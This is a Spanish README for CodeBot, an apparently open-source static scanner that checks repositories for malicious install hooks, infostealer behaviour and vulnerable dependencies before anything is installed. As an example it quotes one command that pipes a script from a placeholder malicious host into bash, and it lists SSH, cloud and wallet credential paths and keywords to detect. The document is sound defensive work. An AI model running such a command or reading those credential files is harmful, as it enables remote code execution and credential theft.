# 🛡️ CodeBot v3.3 — Pre-Execution Security Auditor

Al clonar o descargar un proyecto de terceros (como retos técnicos o asignaciones para realizar en casa), el motor de paquetes de Node.js o Python ejecuta automáticamente los **lifecycle hooks** (`postinstall`, `preinstall`, `prepare`). Si un atacante inyectó comandos maliciosos en estos scripts, tu máquina de desarrollo se infectará en milisegundos, **sin haber ejecutado aún una sola línea del código de la aplicación**.

`CodeBot` actúa como un **Pre-flight Check** estático y ultra-rápido que analiza repositorios antes de que instales sus dependencias o compiles su código.

---

## 🚨 Necesidades que Atiende y Problemas Urgentes que Resuelve

### 1. Vector de Ataque: Infostealers & Exfiltración de Credenciales
Los malware de tipo *Infostealer* (como RedLine, Lumma o Vidar) buscan en silencio dentro del sistema operativo objetivo archivos altamente sensibles:
* **Claves SSH privadas** (`~/.ssh/id_rsa`, `~/.ssh/id_ed25519`).
* **Credenciales de Cloud** (`~/.aws/credentials`, `~/.config/gcloud/`, `~/.azure/`).
* **Billeteras de Criptomonedas** (Metamask, Phantom, Rabby, `keystore.json`).
* **Tokens de sesión y Auth** (Discord, Telegram, Cookies de navegadores Web).

💡 **Solución de CodeBot:** Escanea estáticamente el código fuente en busca de llamadas o lecturas sospechosas a rutas críticas del sistema antes de compilar o ejecutar el proyecto.

### 2. Ejecución Automática sin Autorización en Lifecycle Scripts
Comandos ocultos como `curl http://sitio-malicioso.com/script.sh | bash` dentro del archivo `package.json` permiten la descarga y ejecución remota de código (RCE) en segundo plano.

💡 **Solución de CodeBot:** Analiza la sintaxis de los hooks de instalación y alerta inmediatamente con una 🔴 **ALERTA CRÍTICA** prohibiendo la ejecución de comandos como `npm install` o `pip install`.

### 3. Falta de Entornos Aislados (Sandboxing) en Evaluaciones Rápidas
La mayoría de los desarrolladores no configuran una máquina virtual o contenedor Docker aislado solo para revisar un reto técnico de 2 horas.

💡 **Solución de CodeBot:** Funciona como una capa de auditoría efímera y segura. Clona el repositorio de forma segura en un entorno temporal (`/tmp`), ejecuta las reglas de análisis estático sin arrancar el código, genera el reporte y destruye los archivos locales de inmediato.

---

## 🛠️ Arquitectura Técnica y Módulos de Análisis

CodeBot v3.3 está diseñado bajo principios de alta precisión y baja tasa de falsos positivos (*Low False Positives*):

```plaintext
 ┌────────────────────────────────────────────────────────┐
 │                   Entrada: GitHub URL                  │
 └───────────────────────────┬────────────────────────────┘
                             │
                             ▼
 ┌────────────────────────────────────────────────────────┐
 │       Clonación Efímera en Sandbox (Directorio /tmp)  │
 └───────────────────────────┬────────────────────────────┘
                             │
       ┌─────────────────────┼─────────────────────┐
       ▼                     ▼                     ▼
┌──────────────┐      ┌──────────────┐      ┌──────────────┐
│  Lifecycle   │      │ Anti-Stealer │      │ Vulnerable   │
│ Scripts Scan │      │ Patterns     │      │ Dependencies │
└──────┬───────┘      └──────┬───────┘      └──────┬───────┘
       │                     │                     │
       └─────────────────────┼─────────────────────┘
                             │
                             ▼
 ┌────────────────────────────────────────────────────────┐
 │             Reporte Ejecutivo de Hallazgos             │
 └────────────────────────────────────────────────────────┘
```

### Módulos Integrados:
* **`lifecycle_script_audit`**: Inspecciona `package.json` buscando invocaciones a `curl`, `wget`, `powershell`, `base64`, `eval` o ejecuciones de binarios locales en scripts de instalación.
* **`infostealer_detection`**: Aplica reglas heurísticas y patrones Regex optimizados para detectar accesos no autorizados a directorios `.ssh`, `.aws`, wallets o datos de navegadores.
* **`dependency_vulnerability`**: Auditoría automatizada de paquetes vulnerables mediante integraciones nativas con `pip-audit` y `npm audit`.
* **`insecure_practices`**: Identificación de deserializaciones peligrosas (`pickle`, `yaml.load` inseguros), funciones dinámicas (`eval`, `exec`) y sumas de verificación débiles en contextos de credenciales.

---

## 🚀 Uso Rápido (CLI)

### 1. Instalación de dependencias
```bash
pip install -r requirements.txt
```

### 2. Ejecutar escaneo local o sobre un repositorio remoto

* **Escanear un repositorio público de GitHub:**
  ```bash
  python -m codebot.cli scan https://github.com/usuario/repositorio-sospechoso
  ```

* **Escanear una carpeta local antes de instalar paquetes:**
  ```bash
  python -m codebot.cli scan /ruta/a/mi-proyecto
  ```

---

## 📊 Estructura del Proyecto

```plaintext
codebot-mvp/
├── codebot/             # Motor central de auditoría y CLI
│   ├── auditor.py       # Lógica de escaneo, reglas y modelos
│   ├── cli.py           # Interfaz de línea de comandos (Typer/Rich)
│   └── __init__.py
├── api/                 # Endpoint serverless (FastAPI)
│   └── main.py
├── bot/                 # Bot de comunicación (Telegram)
│   └── telegram_bot.py
├── requirements.txt     # Dependencias del proyecto
└── README.md            # Documentación principal
```
---

## 🛡️ Security Auditor (stand-alone tool)

Este repositorio incluye una herramienta **independiente** de auditoría de seguridad para repositorios Python. Puede ejecutarse por sí sola, sin necesidad de desplegar todo el stack de CodeBot, y es útil para cualquier proyecto Python que quieras revisar rápidamente.

### ✨ ¿Qué hace?

- 🔍 **Análisis estático con AST** — Detecta llamadas peligrosas como `exec()`, `eval()`, `subprocess.run()`, `os.system()`, `pickle.loads()`, etc.
- 🔐 **Escaneo de secretos hardcodeados** — Busca API keys (OpenAI, AWS), contraseñas, tokens y claves privadas embebidas en el código.
- 📦 **Detección de imports riesgosos** — Identifica módulos potencialmente peligrosos (`subprocess`, `socket`, `ctypes`, `smtplib`, `paramiko`, etc.).
- 🧪 **Verificación de sandbox** — Comprueba si el repositorio incluye mecanismos explícitos de aislamiento.
- 📊 **Reporte con severidad y risk score** — Clasifica los hallazgos en `CRITICAL`, `HIGH`, `MEDIUM`, `LOW`, `INFO` y calcula un score global.
- 📝 **Exportación automática** — Genera `audit_report.json` (detalle completo) y `SECURITY_AUDIT.md` (resumen ejecutivo).

### 🚀 Uso rápido (Google Colab)

1. Abre una celda nueva en Colab.
2. Copia el contenido de [`security_auditor.py`](./security_auditor.py).
3. Ejecuta la celda. Aparecerá una interfaz con un campo de texto y un botón.
4. Pega la **URL del repositorio de GitHub** (raíz o subdirectorio) o una **ruta local**.
5. Pulsa **🚀 Ejecutar Auditoría**.
6. Descarga los archivos `audit_report.json` y `SECURITY_AUDIT.md` desde el panel de archivos de Colab.

> 💡 **Tip:** Acepta URLs como `https://github.com/usuario/repo/tree/main/subcarpeta` y las convierte automáticamente a la URL raíz clonable.

### 🖥️ Uso local (fuera de Colab)

```bash
# Clonar el repo
git clone https://github.com/jegazhu/codebot-mvp.git
cd codebot-mvp

# Instalar dependencias (solo si usas la UI de widgets)
pip install ipywidgets

# Ejecutar el auditor (requiere Jupyter para la UI)
jupyter notebook security_auditor.py
---

## 🛡️ Licencia & Contribuciones

Este proyecto es de **código abierto** con el objetivo de proteger a la comunidad global de desarrolladores. Las contribuciones en forma de nuevas reglas de detección, mejoras en las heurísticas o soporte para más gestores de paquetes son siempre bien recibidas.
